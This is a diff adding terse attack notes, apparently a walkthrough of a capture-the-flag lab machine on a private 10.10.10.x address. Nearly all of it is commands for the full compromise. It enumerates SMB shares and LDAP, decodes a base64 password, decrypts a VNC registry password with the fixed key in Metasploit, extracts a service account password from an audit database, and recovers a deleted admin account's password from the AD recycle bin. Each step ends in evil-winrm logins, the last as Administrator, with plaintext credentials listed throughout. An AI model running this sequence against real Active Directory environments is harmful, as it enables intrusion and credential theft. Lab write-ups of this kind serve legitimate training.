@@ -1,0 +1,41 @@
+//Based on TRX
+smbclient -L 10.10.10.182
+python3 /opt/windapsearch/windapsearch.py -U --full --dc-ip 10.10.10.182
+echo "clk0bjVldmE=" | base64 -d
+r.thompson : rY4n5eva (Ryan Thonmpson)
+smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
+smbclient \\\\10.10.10.182\\Data -U r.thompson
+ls
+\IT\Email Archives\Meeting_Notes_June_2018.html
+iTempAdmin:<same as normal admin account>
+get \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log
+get \IT\Logs\DCs\dcdiag.log
+get \IT\Temp\s.smith\VNC Install.reg
+//"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+msfconsole
+irb
+key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
+require 'rex/proto/rfb'
+Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
+s.smith:sT333ve2
+evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
+
+Get-ADUser -identity s.smith -properties *
+smbclient \\\\10.10.10.182\\NETLOGON -U s.smith
+ls
+cat MapAuditDrive.vbs
+smbclient \\\\10.10.10.182\\Audit$ -U s.smith
+mask ""
+recurse ON
+prompt OFF
+mget *		//downloads all files in smbclient share
+cat Audit.db
+INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
+python3 decrypt.py
+ArkSvc:w3lc0meFr31nd
+evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
+whoami /all
+GEt-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects	//enumerate active directory recicle bin
+C:\Users\arksvc\Documents> GEt-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
+YmFDVDNyMWFOMDBkbGVz
+evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
